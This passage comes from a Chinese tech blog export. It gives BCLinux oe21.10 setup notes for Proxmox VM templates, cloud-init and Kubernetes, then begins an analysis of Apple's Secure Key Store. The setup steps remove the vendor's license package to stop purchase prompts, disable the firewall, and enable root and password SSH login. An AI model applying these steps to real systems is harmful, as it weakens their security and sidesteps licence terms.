href=\"#1-版本规划\" class=\"headerlink\" title=\"1. 版本规划\"></a>1. 版本规划</h3><p>作为Linux的发行版，BCLinux 有两个完全不同的技术路线，早期的版本是基于 Centos 定制化，包括：</p>\n<ul>\n<li>V7: 基于 Centos 7，目前包含 v7.8，仅提供x86架构</li>\n<li>V8: 基于 Centos 8，目前包含 v8.2、v8.2、v8.6，仅提供 x86 架构</li>\n</ul>\n<p>随着 Centos 停服日期的迫近，以及自主可控操作系统的要求，BCLinux 转向了 OpenEuler，包括：</p>\n<ul>\n<li>oe1: 基于 OpenEuler 20.12，仅提供ARM64架构</li>\n<li>oe21.10: 基于 OpenEuler 21.10 和 21.10U3，提供 x86 和 ARM64 架构</li>\n<li>oe22.10: 基于 OpenEuler 22.10 和 22.10U1，提供 x86 和 ARM64 架构</li>\n</ul>\n<p>目前 BCLinux 的版本生命周期的规划如下：<br><img src=\"/2023/08/17/BCLinux-oe21-10-%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/LTS.png\" alt=\"版本计划\"></p>\n<h3 id=\"2-与-open-Euler-的关系\"><a href=\"#2-与-open-Euler-的关系\" class=\"headerlink\" title=\"2. 与 open Euler 的关系\"></a>2. 与 open Euler 的关系</h3><p>尽管目前的 BCLinux 是基于 <a href=\"https://www.openeuler.org/zh/\">openEuler</a> 的定制化版本，但也存在明显的差异。<br><img src=\"/2023/08/17/BCLinux-oe21-10-%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/openEuler.png\" alt=\"openEuler\"></p>\n<ul>\n<li>BCLinux oe22.10 和 oe22.10 都是基于 OpenEuler 的非公开发行版本</li>\n<li>BCLinux 仅提供 x86_64 和 AArch64 架构，但 openEuler 还提供了 ARM32、RISC-V、LoongArch64、Power 和 SW64 架构。</li>\n</ul>\n<h2 id=\"二、安装方法\"><a href=\"#二、安装方法\" class=\"headerlink\" title=\"二、安装方法\"></a>二、安装方法</h2><p>本次测试的基准版本是 BCLinux oe21.10 的 x86-64 架构。</p>\n<h3 id=\"1-准备工作\"><a href=\"#1-准备工作\" class=\"headerlink\" title=\"1. 准备工作\"></a>1. 准备工作</h3><ol>\n<li>通过官方站点<a href=\"https://mirrors.cmecloud.cn/bclinux/oe21.10/ISO/x86_64/release/\">https://mirrors.cmecloud.cn/bclinux/oe21.10/ISO/x86_64&#x2F;release&#x2F;</a>下载ISO安装盘，有基础版本和全量版本，以及两个后续的补丁版本。</li>\n<li>新建一个虚拟机，挂载ISO安装盘，建议内存至少 1GB，硬盘至少 10GB。<br>启动后，根据安装向导提示信息，选择中国上海时区，设置root密码（8位以上，至少3种类型字符）、硬盘分区默认即可，最小化安装方式。</li>\n<li>安装完成后启动虚拟机，如果 console 成功登录即为正常。</li>\n</ol>\n<h3 id=\"2-环境设置\"><a href=\"#2-环境设置\" class=\"headerlink\" title=\"2. 环境设置\"></a>2. 环境设置</h3><ol>\n<li><p>虚拟机添加一个 cloudinit 类型的 CDROM 设备，用于后续管理个性化配置数据。<br>此时，可以顺便卸载ISO安装盘的 CDROM 设备。</p>\n</li>\n<li><p>卸载BCLinux的软件许可，否则执行 YUM 等命令时提示要求购买License。</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">rpm -evh `rpm -qa |grep bclinux-license`</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>默认安装后网卡尚未启用，需要手动调整。<br>在<code>/etc/sysconfig/network-scripts/</code>目录中找到网卡配置文件<code>ifcfg-ens18</code>（注意不是常见的<code>eth0</code>），删除<code>UUID</code>，并设置<code>ONBOOT=yes</code>。</p>\n</li>\n<li><p>reboot重启虚拟机，此时通过<code>ip a</code>可以发现IP地址已启用，联网成功。</p>\n<blockquote>\n<p>建议此时将虚拟机转换为模版，再 clone 一个虚拟机用于后续安装，以避免误操作又来一次冗长的安装过程。</p>\n</blockquote>\n</li>\n</ol>\n<h3 id=\"3-基线版本配置\"><a href=\"#3-基线版本配置\" class=\"headerlink\" title=\"3. 基线版本配置\"></a>3. 基线版本配置</h3><ol>\n<li><p>系统软件安装</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 关闭Firewalld</span></span><br><span class=\"line\">systemctl <span class=\"built_in\">disable</span> --now firewalld</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装虚拟化软件</span></span><br><span class=\"line\">yum install -y acpid cloud-init cloud-utils-growpart qemu-guest-agent</span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> acpid</span><br><span class=\"line\">systemctl start qemu-guest-agent</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 禁用zeroconf(零配置网络服务规范)，该协议目的是在系统无法连接DHCP服务的时候，尝试获取类似169.254.0.0的保留IP</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;NOZEROCONF=yes&quot;</span> &gt;&gt; /etc/sysconfig/network</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 防止ssh连接使用dns导致访问过慢</span></span><br><span class=\"line\">sed -ri <span class=\"string\">&#x27;/UseDNS/&#123;s@#@@;s@\\s+.+@ no@&#125;&#x27;</span> /etc/ssh/sshd_config</span><br><span class=\"line\">systemctl restart sshd</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>系统安装已默认关闭 selinux， 但仍然启用 firewalld 系统服务</li>\n<li>系统安装默认使用 NetworkManager，因为 networkd.service 已被默认移除</li>\n<li>cloud-init 是核心的虚拟机管理软件，acpid 用于控制虚拟机的电源设备以便宿主机执行关机命令，cloud-utils-growpart 用于调整虚拟机的分区设置，qemu-guest-agent 用于虚拟机接受宿主机的命令并反馈结果，后续PVE管理界面可以直接显示IP地址信息。</li>\n<li>BCLinux 已经预置了 git 、net-tools 等常用工具，但没有yum-utils软件包，而是自带 dnf 管理器 yum-config-manager</li>\n</ul>\n<blockquote>\n<p>注意：dnf 工具包中reposync 和 createrepo 等命令的参数有所不同！！！</p>\n</blockquote>\n</li>\n<li><p>手工调整cloudinit配置文件<code>/etc/cloud/cloud.cfg</code><br>当前cloud-init的版本是 19.4 ，建议修改以下参数：</p>\n<ul>\n<li>disable_root：false，即允许直接登录虚拟机（默认不允许 root 登录）</li>\n<li>ssh_pwauth：1，即允许以 ssh passwod 方式登录（默认只能通过 private key 登录）</li>\n<li>package-update-upgrade-install：以 # 开始注释该行，即避免安装后自动更新系统软件</li>\n<li>default-user：以 # 开始注释该段落，默认将创建 openEuler 用户</li>\n</ul>\n</li>\n<li><p>虚拟机关机，并在PVE控制台上将其转换为模版templete，母鸡就此完成。<br>后续，就可以在 PVE 控制台上配置 Cloud-init 的参数，并 clone 该模版启动小鸡了。</p>\n</li>\n</ol>\n<h2 id=\"三、注意事项\"><a href=\"#三、注意事项\" class=\"headerlink\" title=\"三、注意事项\"></a>三、注意事项</h2><h3 id=\"1-上层软件栈\"><a href=\"#1-上层软件栈\" class=\"headerlink\" title=\"1. 上层软件栈\"></a>1. 上层软件栈</h3><p>好消息！官方软件源已包含了许多常用软件，最新版本信息如下：</p>\n<ul>\n<li>nginx: 1.16.1</li>\n<li>python3: 3.7.9</li>\n<li>docker: 18.09.0</li>\n<li>docker-compose: 1.22.0</li>\n<li>openjdk(java): 11.0.12</li>\n<li>nodejs: v12.22.11</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@Copy-of-VM-OpenEular21 yum.repos.d]<span class=\"comment\"># docker -v</span></span><br><span class=\"line\">Docker version 18.09.0, build a8959d5</span><br><span class=\"line\">[root@Copy-of-VM-OpenEular21 yum.repos.d]<span class=\"comment\"># docker-compose -v</span></span><br><span class=\"line\">docker-compose version 1.22.0, build f46880f</span><br><span class=\"line\">[root@Copy-of-VM-OpenEular21 yum.repos.d]<span class=\"comment\"># java -version</span></span><br><span class=\"line\">openjdk version <span class=\"string\">&quot;11.0.12&quot;</span> 2021-07-20</span><br><span class=\"line\">OpenJDK Runtime Environment Bisheng (build 11.0.12+9)</span><br><span class=\"line\">OpenJDK 64-Bit Server VM Bisheng (build 11.0.12+9, mixed mode, sharing)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Qemu-Guest-Agent-系统服务\"><a href=\"#2-Qemu-Guest-Agent-系统服务\" class=\"headerlink\" title=\"2. Qemu Guest Agent 系统服务\"></a>2. Qemu Guest Agent 系统服务</h3><p>PVE在安装虚拟机时会见到<code>Qemu GA</code>这个选项，是开启还是关闭呢？</p>\n<p>Qemu 代理即 qemu-guest-agent，是一个运行在虚拟机里面的程序 qemu-guest-agent是一个帮助程序，守护程序，它安装在虚拟机中，用于在主机和虚拟机之间交换信息，以及在虚拟机中执行命令。<br>在Proxmox VE中，qemu代理有以下作用：</p>\n<ul>\n<li>正确关闭虚拟机，而不是依赖ACPI命令或Windows策略</li>\n<li>在进行备份时冻结来宾文件系统（在Windows上，使用卷影复制服务VSS）</li>\n<li>使用 DHCP 时，可以在控制台上直接看到虚机的 IP 地址，省去登录小鸡的命令操作了。。。</li>\n</ul>\n<p><img src=\"/2023/08/17/BCLinux-oe21-10-%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/qemu-ga.png\" alt=\"qa\"><br>如果想用，不仅需要在pve里开启这个选项，还需要手动安装。</p>\n<h3 id=\"3-Kubernetes集群安装\"><a href=\"#3-Kubernetes集群安装\" class=\"headerlink\" title=\"3. Kubernetes集群安装\"></a>3. Kubernetes集群安装</h3><p>安装过程参考：<a href=\"https://docs.openeuler.org/zh/docs/20.03_LTS_SP1/docs/thirdparty_migration/k8sinstall.html\">K8S 迁移至 openEuler 指导</a></p>\n<ol>\n<li><p>安装docker并调整配置文件，当前版本<code>18.09.0</code></p>\n</li>\n<li><p>yum安装kubenet组件<br> <code>yum install -y kubelet-1.15.10 kubeadm-1.15.10 kubectl-1.15.10 kubernetes-cni-0.7.5</code></p>\n</li>\n<li><p>通过<code>kubeadm config images list</code>获取需要的镜像列表</p>\n <figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">k8s.gcr.io/kube-apiserver:v1.15.12</span><br><span class=\"line\">k8s.gcr.io/kube-controller-manager:v1.15.12</span><br><span class=\"line\">k8s.gcr.io/kube-scheduler:v1.15.12</span><br><span class=\"line\">k8s.gcr.io/kube-proxy:v1.15.12</span><br><span class=\"line\">k8s.gcr.io/pause:3.1</span><br><span class=\"line\">k8s.gcr.io/etcd:3.3.10</span><br><span class=\"line\">k8s.gcr.io/coredns:1.3.1</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>从<code>gcmirrors/kube-apiserver:v1.15.12</code>等镜像站点获取，再改标签为<code>k8s.gcr.io</code></p>\n</li>\n<li><p>启动安装，注意版本号有区别</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl daemon-reload</span><br><span class=\"line\">systemctl restart kubelet</span><br><span class=\"line\">kubeadm init --kubernetes-version v1.15.12 --pod-network-cidr=10.244.0.0/16  </span><br></pre></td></tr></table></figure>\n</li>\n<li><p>安装并启动calico网络插件</p>\n</li>\n<li><p>Master节点启动，并逐一启动Worker各个节点</p>\n</li>\n</ol>\n<hr>\n<h2 id=\"附录一：YUM-官方软件源配置\"><a href=\"#附录一：YUM-官方软件源配置\" class=\"headerlink\" title=\"附录一：YUM 官方软件源配置\"></a>附录一：YUM 官方软件源配置</h2><figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@MiWiFi-RA70-srv ~]# ls /etc/yum.repos.d</span><br><span class=\"line\">BCLinux.repo</span><br><span class=\"line\"></span><br><span class=\"line\">[root@MiWiFi-RA70-srv ~]# more /etc/yum.repos.d/*</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">BCLinux-release.repo</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"></span></span><br><span class=\"line\"><span class=\"language-bash\"><span class=\"comment\">#</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">The mirror system uses the connecting IP address of the client and the</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">update status of each mirror to pick mirrors that are updated to and</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">geographically close to the client.  You should use this <span class=\"keyword\">for</span> BCLinux updates</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">unless you are manually picking other mirrors.</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"></span></span><br><span class=\"line\"><span class=\"language-bash\"><span class=\"comment\"># If the mirrorlist= does not work for you, as a fall back you can try the</span></span> </span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">remarked out baseurl= line instead.</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"></span></span><br><span class=\"line\"><span class=\"language-bash\"><span class=\"comment\">#</span></span></span><br><span class=\"line\">[baseos]</span><br><span class=\"line\">name=BC-Linux-release - baseos</span><br><span class=\"line\">baseurl=http://mirrors.bclinux.org/bclinux/oe21.10/OS/$basearch/</span><br><span class=\"line\">gpgcheck=1</span><br><span class=\"line\">enabled=1</span><br><span class=\"line\">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-BCLinux-For-Euler</span><br><span class=\"line\"></span><br><span class=\"line\">[everything]</span><br><span class=\"line\">name=BC-Linux-release - everything</span><br><span class=\"line\">baseurl=http://mirrors.bclinux.org/bclinux/oe21.10/everything/$basearch/</span><br><span class=\"line\">gpgcheck=1</span><br><span class=\"line\">enabled=1</span><br><span class=\"line\">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-BCLinux-For-Euler</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">[update]</span><br><span class=\"line\">name=BC-Linux-release - update</span><br><span class=\"line\">baseurl=http://mirrors.bclinux.org/bclinux/oe21.10/update/$basearch/</span><br><span class=\"line\">gpgcheck=1</span><br><span class=\"line\">enabled=1</span><br><span class=\"line\">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-BCLinux-For-Euler</span><br><span class=\"line\"></span><br><span class=\"line\">[extras]</span><br><span class=\"line\">name=BC-Linux-release - extras</span><br><span class=\"line\">baseurl=http://mirrors.bclinux.org/bclinux/oe21.10/extras/$basearch/</span><br><span class=\"line\">gpgcheck=1</span><br><span class=\"line\">enabled=1</span><br><span class=\"line\">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-BCLinux-For-Euler</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"附录二：cloudinit-的原始配置\"><a href=\"#附录二：cloudinit-的原始配置\" class=\"headerlink\" title=\"附录二：cloudinit 的原始配置\"></a>附录二：cloudinit 的原始配置</h2><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@MiWiFi-RA70-srv ~]# cat /etc/cloud/cloud.cfg</span><br><span class=\"line\"># The top level settings are used as module</span><br><span class=\"line\"># and system configuration.</span><br><span class=\"line\"></span><br><span class=\"line\"># A set of users which may be applied and/or used by various modules</span><br><span class=\"line\"># when a &#x27;default&#x27; entry is found it will reference the &#x27;default_user&#x27;</span><br><span class=\"line\"># from the distro configuration specified below</span><br><span class=\"line\">users:</span><br><span class=\"line\">   - default</span><br><span class=\"line\"></span><br><span class=\"line\"># If this is set, &#x27;root&#x27; will not be able to ssh in and they</span><br><span class=\"line\"># will get a message to login instead as the default $user</span><br><span class=\"line\">disable_root: true</span><br><span class=\"line\"></span><br><span class=\"line\">mount_default_fields: [~, ~, &#x27;auto&#x27;, &#x27;defaults,nofail&#x27;, &#x27;0&#x27;, &#x27;2&#x27;]</span><br><span class=\"line\">resize_rootfs_tmp: /dev</span><br><span class=\"line\">ssh_pwauth:   0</span><br><span class=\"line\"></span><br><span class=\"line\"># This will cause the set+update hostname module to not operate (if true)</span><br><span class=\"line\">preserve_hostname: false</span><br><span class=\"line\"></span><br><span class=\"line\"># Example datasource config</span><br><span class=\"line\"># datasource:</span><br><span class=\"line\">#    Ec2:</span><br><span class=\"line\">#      metadata_urls: [ &#x27;blah.com&#x27; ]</span><br><span class=\"line\">#      timeout: 5 # (defaults to 50 seconds)</span><br><span class=\"line\">#      max_wait: 10 # (defaults to 120 seconds)</span><br><span class=\"line\"></span><br><span class=\"line\"># The modules that run in the &#x27;init&#x27; stage</span><br><span class=\"line\">cloud_init_modules:</span><br><span class=\"line\"> - migrator</span><br><span class=\"line\"> - seed_random</span><br><span class=\"line\"> - bootcmd</span><br><span class=\"line\"> - write-files</span><br><span class=\"line\"> - growpart</span><br><span class=\"line\"> - resizefs</span><br><span class=\"line\"> - disk_setup</span><br><span class=\"line\"> - mounts</span><br><span class=\"line\"> - set_hostname</span><br><span class=\"line\"> - update_hostname</span><br><span class=\"line\"> - update_etc_hosts</span><br><span class=\"line\"> - ca-certs</span><br><span class=\"line\"> - rsyslog</span><br><span class=\"line\"> - users-groups</span><br><span class=\"line\"> - ssh</span><br><span class=\"line\"></span><br><span class=\"line\"># The modules that run in the &#x27;config&#x27; stage</span><br><span class=\"line\">cloud_config_modules:</span><br><span class=\"line\"> - ssh-import-id</span><br><span class=\"line\"> - locale</span><br><span class=\"line\"> - set-passwords</span><br><span class=\"line\"> - spacewalk</span><br><span class=\"line\"> - yum-add-repo</span><br><span class=\"line\"> - ntp</span><br><span class=\"line\"> - timezone</span><br><span class=\"line\"> - disable-ec2-metadata</span><br><span class=\"line\"> - runcmd</span><br><span class=\"line\"></span><br><span class=\"line\"># The modules that run in the &#x27;final&#x27; stage</span><br><span class=\"line\">cloud_final_modules:</span><br><span class=\"line\"> - package-update-upgrade-install</span><br><span class=\"line\"> - puppet</span><br><span class=\"line\"> - chef</span><br><span class=\"line\"> - mcollective</span><br><span class=\"line\"> - salt-minion</span><br><span class=\"line\"> - rightscale_userdata</span><br><span class=\"line\"> - scripts-vendor</span><br><span class=\"line\"> - scripts-per-once</span><br><span class=\"line\"> - scripts-per-boot</span><br><span class=\"line\"> - scripts-per-instance</span><br><span class=\"line\"> - scripts-user</span><br><span class=\"line\"> - ssh-authkey-fingerprints</span><br><span class=\"line\"> - keys-to-console</span><br><span class=\"line\"> - phone-home</span><br><span class=\"line\"> - final-message</span><br><span class=\"line\"> - power-state-change</span><br><span class=\"line\"></span><br><span class=\"line\"># System and/or distro specific settings</span><br><span class=\"line\"># (not accessible to handlers/transforms)</span><br><span class=\"line\">system_info:</span><br><span class=\"line\">   # This will affect which distro class gets used</span><br><span class=\"line\">   distro: openEuler</span><br><span class=\"line\">   # Default user name + that default users groups (if added/used)</span><br><span class=\"line\">   default_user:</span><br><span class=\"line\">     name: openEuler</span><br><span class=\"line\">     lock_passwd: True</span><br><span class=\"line\">     gecos: openEuler Cloud User</span><br><span class=\"line\">     groups: [wheel, adm, systemd-journal]</span><br><span class=\"line\">     sudo: [&quot;ALL=(ALL) NOPASSWD:ALL&quot;]</span><br><span class=\"line\">     shell: /bin/bash</span><br><span class=\"line\">   # Other config here will be given to the distro class and/or path classes</span><br><span class=\"line\">   paths:</span><br><span class=\"line\">      cloud_dir: /var/lib/cloud/</span><br><span class=\"line\">      templates_dir: /etc/cloud/templates/</span><br><span class=\"line\">   ssh_svcname: sshd</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.openeuler.org/zh/download/archive/\">openEuler 官网软件源</a></li>\n<li><a href=\"https://blog.csdn.net/bright69/article/details/126783599\">BCLinux ECS 基线版本的构造分析</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1987533\">通过QEMU-GuestAgent实现从外部注入写文件到KVM虚拟机内部</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/2008066\">PVE创建openEuler虚拟机模板</a></li>\n<li><a href=\"https://gameapp.club/post/2022-07-30-custom-cloud-init-for-pve/\">基于cloud-init定制虚拟机</a></li>\n<li><a href=\"https://help.aliyun.com/zh/ecs/methods-and-impacts-of-switching-the-network-service-for-instances-that-run-alibaba-cloud-linux-2\">Alibaba Cloud Linux 2实例修改网络服务的方法及影响说明</a></li>\n</ul>\n"},{"title":"Apple Secure Key Store 硬件加密技术分析","url":"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","content":"<p>根据<a href=\"Apple_iOS_16_iPhone_Security_Target_v1.1.pdf\">iOS 16 安全评估报告</a>的表述（P16-P20），Apple 设备提供的加密服务分为三个层级：</p>\n<ul>\n<li>User Space：SL1，软件级。驻留在用户空间内的动态可加载库，为 App 提供加密功能</li>\n<li>Kernel Space：SL1，软件级。操作系统内核加载的扩展模块，仅为内核提供加密功能</li>\n<li>Secure Key Store：SL2，硬件级。一个单芯片独立硬件加密模块，为静态数据和数据传输提供保护，包含固件和硬件加密算法实现</li>\n</ul>\n<p>Secure Key Store（安全密钥存储，SKS，也称 Secure Key Service）是 Apple Secure Enclave 的加密模块，也是其硬件加密技术的核心组件。</p>\n<ul>\n<li>根据 Apple 官网提供的<a href=\"https://support.apple.com/zh-cn/guide/certifications/welcome/web\">第三方平台认证信息</a>，其硬件、操作系统、应用软件、互联网服务和 Apple Pay 广泛采用 FIPS 140-2 加密标准（FIPS 140-3 认证已提交但尚未通过），当前<a href=\"https://csrc.nist.gov/CSRC/media/projects/cryptographic-module-validation-program/documents/security-policies/140sp3811.pdf\">硬件加密模块 v10.0</a> 获得 CMVP 颁发的<a href=\"https://csrc.nist.gov/Projects/cryptographic-module-validation-program/Certificate/3811\">3811 证书</a>。</li>\n<li>Apple 积极参与通用标准 (CC) 评估，当前<a href=\"https://www.niap-ccevs.org/Product/index.cfm\">认证产品清单</a>包括：macOS 13 Ventura（含<a href=\"https://www.niap-ccevs.org/MMO/Product/st_vid11348-st.pdf\">FileVault</a>）、iOS 15 &amp; <a href=\"https://www.niap-ccevs.org/MMO/Product/st_vid11349-st.pdf\">iOS 16</a>；iPadOS 15 &amp; iPadOS 16，由 <a href=\"https://www.atsec.com/\">ATSEC 公司</a>出具 TOE（Target of Evaluation）评估报告。</li>\n<li>2016年美国举办的 Black hat 会议上，Apple 公司的 Ivan Krstic 介绍了数据保护技术，也是难得的<a href=\"(Behind_the_Scenes_with_iOS_Security.pdf)\">官方资料</a>。</li>\n</ul>\n<p>本文就是依据上述公开信息的研究分析。</p>\n<h2 id=\"一、Secure-Key-Store-总体架构\"><a href=\"#一、Secure-Key-Store-总体架构\" class=\"headerlink\" title=\"一、Secure Key Store 总体架构\"></a>一、Secure Key Store 总体架构</h2><h3 id=\"1-硬件环境\"><a href=\"#1-硬件环境\" class=\"headerlink\" title=\"1. 硬件环境\"></a>1. 硬件环境</h3><p>根据<a href=\"Apple_Secure_Key_Store_Cryptographic_Module_with_Notes.pdf\">Apple SKS 加密模块</a>的表述，其逻辑边界包含以下组件：</p>\n<p><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/SKS-arch.png\" alt=\"SKS\"></p>\n<ul>\n<li>SEP（Secure Encalve Processor）：区别于 REE 环境的应用处理器 AP，位于 TEE 环境的安全隔区拥有独立的应用处理器<br>  SEP 运行的操作系统称为 sepOS（基于 L4 微内核的 Apple 定制版本）<br>  TOE OS 和 sepOS 之间采用物理隔离方式，仅能通过 Mailbox 完成数据交互</li>\n<li>SKS（Secure Key Store，安全密钥存储）：负责生成并管理 CSP（Critical Security Parameter，关键安全参数），为静态数据加密所需密钥提供关键的加密材料<br>  按照 FIPS 140-2 的要求提供 POST（Power-On Self Test，启动自检）功能，以确保模块的完整性和加密功能的正确性</li>\n<li>HW AES：基于硬件实现的 AES 加密算法，Apple 安全隔区支持对抗时序攻击、静态功耗分析（SPA）和动态功耗分析 (DPA)。</li>\n<li>UID：在 SoC 生产环节，使用基于 AES 算法的 DRBG 生成 UID，然后蚀刻到硅片上的 OTP-ROM（One Time Programmable Read-Only Memory，一次性编程的只读内存，即熔丝），它只能通过 AES 引擎处理加密和解密操作，即使 SEP 的 Apps 也无法读取</li>\n<li>HW DRBG：基于硬件实现的伪随机数发生器（确定性随机数发生器），内置专用的 AES 引擎实现 CTR_DRBG 算法</li>\n</ul>\n<blockquote>\n<p>早期的 A8 处理器的硬件版本是 1.0，A9 及后续处理器升级为 2.0，差异在于是否提供 PAA (Processor Algorithm Accelerator，处理器算法加速，基于 ARM NEON 指令集实现)。</p>\n</blockquote>\n<p>对比 Apple 平台安全技术白皮书提供的信息，HW AES &#x3D; Secure Enclave AES Engine，此外还有 PKA（public key acceleration，公钥加速器）。</p>\n<p><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/soc.png\" alt=\"SoC\"></p>\n<h3 id=\"2-应用架构\"><a href=\"#2-应用架构\" class=\"headerlink\" title=\"2. 应用架构\"></a>2. 应用架构</h3><p>根据<a href=\"us-16-Mandt-Demystifying-The-Secure-Enclave-Processor.pdf\">Demystifying the Secure Enclave Processor</a>的 P61 的描述，Secure Key Store 作为 SEPOS 的一个功能模块，其暴露在 SL1 级（内核 XNU）的 Endpoint 就是一个内核扩展<code>AppleKeyStore.kext</code>。此外，SEPOS 还包含了其他类型的 APP，包括：</p>\n<ul>\n<li>ART Manager：反重放攻击服务</li>\n<li>Secure Biometric Engine：生物识别引擎，简称 SBIO，用于 Touce ID 和 Face ID 等</li>\n<li>Secure Credential Manager：凭据管理，用于网络连接和配件的安全管理</li>\n<li>SSE：未知。似乎用于硬件识别？</li>\n</ul>\n<p><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/sepos.png\" alt=\"SEPOS\"></p>\n<h2 id=\"二、-Secure-Key-Store-密码算法\"><a href=\"#二、-Secure-Key-Store-密码算法\" class=\"headerlink\" title=\"二、 Secure Key Store 密码算法\"></a>二、 Secure Key Store 密码算法</h2><p><a href=\"Apple_Secure_Key_Store_Cryptographic_Module_with_Notes.pdf\">Apple SKS 加密模块</a>有完整的的表述。</p>\n<h3 id=\"1-完全符合-FIPS-140-2-标准的算法\"><a href=\"#1-完全符合-FIPS-140-2-标准的算法\" class=\"headerlink\" title=\"1. 完全符合 FIPS 140-2 标准的算法\"></a>1. 完全符合 FIPS 140-2 标准的算法</h3><ul>\n<li>对称加密&#x2F;解密算法：基于<a href=\"https://csrc.nist.gov/pubs/fips/197/final\">FIPS 197</a>的 AES 算法，工作模式包括：<ul>\n<li><a href=\"https://csrc.nist.gov/pubs/sp/800/38/a/final\">SP 800-38 A</a> ：工作模式 ECB CBC CFB OFB CTR</li>\n<li><a href=\"https://csrc.nist.gov/pubs/sp/800/38/c/upd1/final\">SP 800-38 C</a> ：加密认证模式 CCM</li>\n<li><a href=\"https://csrc.nist.gov/pubs/sp/800/38/d/final\">SP 800-38 D</a> ：工作模式 GMAC</li>\n<li><a href=\"https://csrc.nist.gov/pubs/sp/800/38/e/final\">SP 800-38 E</a> ：磁盘加密模式 AES-XTS</li>\n<li><a href=\"https://csrc.nist.gov/pubs/sp/800/38/f/final\">SP 800-38 F</a> ：密钥包裹传输 AES-KW</li>\n</ul>\n</li>\n<li>数字签名（非对称加密&#x2F;解密）算法：基于<a href=\"https://csrc.nist.gov/pubs/fips/186-4/final\">FIPS 186-4</a>，<ul>\n<li>ECDSA 椭圆曲线采用 P-2224, P-256, P-384, P-521，加密算法符合 ANSI X9.62 标准</li>\n<li>签名生成和校验算法采用 SHA</li>\n</ul>\n</li>\n<li>消息摘要算法：基于<a href=\"https://csrc.nist.gov/pubs/fips/180-4/upd1/final\">FIPS 180-4</a> 的 SHA 算法</li>\n<li>消息验证算法：基于<a href=\"https://csrc.nist.gov/pubs/fips/198-1/final\">FIPS 198</a>的 HMAC 算法</li>\n<li>DRBG：基于<a href=\"https://csrc.nist.gov/pubs/sp/800/90/a/r1/final\">SP 800-90A</a> 的确定性随机数生成算法</li>\n<li>密钥交换算法：基于<a href=\"https://csrc.nist.gov/pubs/sp/800/56/a/r3/final\">SP 800-56A</a> 的一次性 DH 算法</li>\n</ul>\n<blockquote>\n<p>ANSI（American National Standards Institute，美国国家标准协会）是一个非盈利组织，也是 IEEE 和 ISO 标准化组织的成员，还记得 ANSI C 吗？<br><a href=\"https://x9.org/\">ANSI X9</a> 系列标准主要用于金融服务业，是信息和数据安全的重要参考。</p>\n</blockquote>\n<h3 id=\"2-不完全符合-FIPS-140-2-标准，但被允许使用的算法\"><a href=\"#2-不完全符合-FIPS-140-2-标准，但被允许使用的算法\" class=\"headerlink\" title=\"2. 不完全符合 FIPS 140-2 标准，但被允许使用的算法\"></a>2. 不完全符合 FIPS 140-2 标准，但被允许使用的算法</h3><ul>\n<li>密钥扩展算法：基于<a href=\"https://csrc.nist.gov/pubs/sp/800/132/final\">SP 800-132</a>的 PBKDF 算法，Apple 基于 HMAC 和 SHA-256（早期为 SHA-1）的定制化 PBKDF2 算法，注意不支持自检功能！</li>\n<li>TRNG：Apple 定制的，基于物理过程的真随机数生成器</li>\n</ul>\n<h3 id=\"3-未获得-FIPS-140-2-批准的算法\"><a href=\"#3-未获得-FIPS-140-2-批准的算法\" 